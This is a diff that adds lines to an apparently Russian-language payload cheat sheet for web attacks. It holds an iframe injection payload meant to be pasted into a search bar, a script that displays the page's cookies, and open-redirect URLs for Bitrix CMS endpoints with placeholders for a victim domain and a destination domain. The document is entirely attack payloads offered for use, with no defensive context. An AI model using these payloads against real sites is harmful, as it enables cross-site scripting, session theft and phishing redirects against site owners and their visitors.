@@ -3,3 +3,12 @@ Payload:
 Вставлять в поисковую строку или на прямую
 
 <iframe src="линк" height="4000%" width="4000%"></iframe>
+
+<script>alert("cookie: "+document.cookie)</script>
+
+/bitrix/click.php?anything=here&goto=https://google.com/
+/bitrix/rk.php?goto=https://google.com/
+
+{домен_жертва}/bitrix/click.php?anything=here&goto={домен_цель}/
+{домен_жертва}/bitrix/rk.php?id=17&site_id=s1&event1=banner&event2=click&goto= {домен_цель}/
+{домен_жертва}/bitrix/redirect.php?event1=click_to_call&event2=&event3=&goto={домен_цель}/
